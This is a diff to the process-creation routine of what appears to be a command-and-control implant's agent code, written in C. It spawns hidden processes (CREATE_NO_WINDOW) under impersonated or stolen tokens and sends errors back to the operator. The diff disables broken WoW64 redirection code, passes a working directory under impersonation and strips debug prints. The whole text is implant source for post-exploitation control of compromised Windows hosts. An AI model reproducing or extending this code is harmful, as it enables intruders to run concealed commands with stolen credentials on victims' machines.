@@ -311,30 +311,36 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         StartUpInfo.hStdInput  = NULL;
     }
 
+    /*
+    TODO: doesn't work. always getting ERROR_INVALID_FUNCTION
     if ( EnableWow64 )
     {
-        if ( ProcessIsWow( NtCurrentProcess() ) )
+        PUTS( "Enable Wow64 process support" )
+        if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
         {
-            PUTS( "Enable Wow64 process support" )
-            if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
-            {
-                PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                Return = FALSE;
-                goto Cleanup;
-            }
+            PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
+            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+            Return = FALSE;
+            goto Cleanup;
         }
-    }
+    }*/
 
     if ( Instance->Tokens.Impersonate )
     {
         PUTS( "Impersonate" )
 
+        LPWSTR lpCurrentDirectory   = NULL;
+        WCHAR  Path[ MAX_PATH * 2 ] = { 0 };
+
+        if ( Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) )
+            lpCurrentDirectory = Path;
+
         TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );
         CommandLineW = Instance->Win32.LocalAlloc( LPTR, CommandLineSize * 2 );
         CharStringToWCharString( CommandLineW, CmdLine, CommandLineSize );
 
-        PRINTF( "CommandLineW[%d]: %ls\n", CommandLineSize, CommandLineW )
+        PRINTF( "CommandLineW[%d]  : %ls\n", CommandLineSize, CommandLineW )
+        PRINTF( "lpCurrentDirectory: %ls\n", lpCurrentDirectory )
 
         if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
         {
@@ -346,7 +352,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                     CommandLineW,
                     Flags | CREATE_NO_WINDOW,
                     NULL,
-                    NULL,
+                    lpCurrentDirectory,
                     &StartUpInfo,
                     ProcessInfo
                     )
@@ -371,7 +377,7 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
                         CommandLineW,
                         Flags | CREATE_NO_WINDOW,
                         NULL,
-                        NULL,
+                        lpCurrentDirectory,
                         &StartUpInfo,
                         ProcessInfo
                     )
@@ -411,20 +417,20 @@ BOOL ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PRO
         }
     }
 
+    /*
+    TODO: doesn't work. always getting ERROR_INVALID_FUNCTION
     if ( EnableWow64 )
     {
-        if ( ProcessIsWow( NtCurrentProcess() ) )
+        if ( ! Instance->Win32.Wow64RevertWow64FsRedirection( Wow64Value ) )
         {
-            if ( ! Instance->Win32.Wow64RevertWow64FsRedirection( Wow64Value ) )
-            {
-                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                Return = FALSE;
-                goto Cleanup;
-            }
+            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+            Return = FALSE;
+            goto Cleanup;
         }
     }
+     */
 
-    // Check if we managed to spawn a process
+    /* Check if we managed to spawn a process */
     if ( ProcessInfo->hProcess && Instance->Config.Implant.Verbose )
     {
         PUTS( "Send info back" )
@@ -473,18 +479,13 @@ Cleanup:
     PUTS( "Process cleanup" )
     if ( CommandLineW )
     {
-        PUTS( "1" )
         MemSet( CommandLineW, 0, CommandLineSize * 2 );
         Instance->Win32.LocalFree( CommandLineW );
     }
 
-    PUTS( "2" )
     PackageDestroy( Package );
-
-    PUTS( "3" )
     AnonPipesClose( &AnonPipe );
 
-    PUTS( "4" )
     return Return;
 }
 
